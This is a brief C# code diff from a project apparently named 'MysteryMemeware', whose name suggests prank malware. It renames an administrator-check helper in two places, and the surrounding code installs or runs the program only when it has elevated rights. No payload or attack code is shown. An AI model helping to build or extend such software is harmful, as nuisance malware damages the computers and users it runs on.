@@ -18,7 +18,7 @@ namespace MysteryMemeware
             {
                 if (IsInstalled())
                 {
-                    if (ProcessHelper.CurrentProcessIsAdmin())
+                    if (ProcessHelper.IsAdmin())
                     {
                         Run();
                     }
@@ -36,7 +36,7 @@ namespace MysteryMemeware
                 }
                 else
                 {
-                    if (ProcessHelper.CurrentProcessIsAdmin())
+                    if (ProcessHelper.IsAdmin())
                     {
                         Install();
                     }
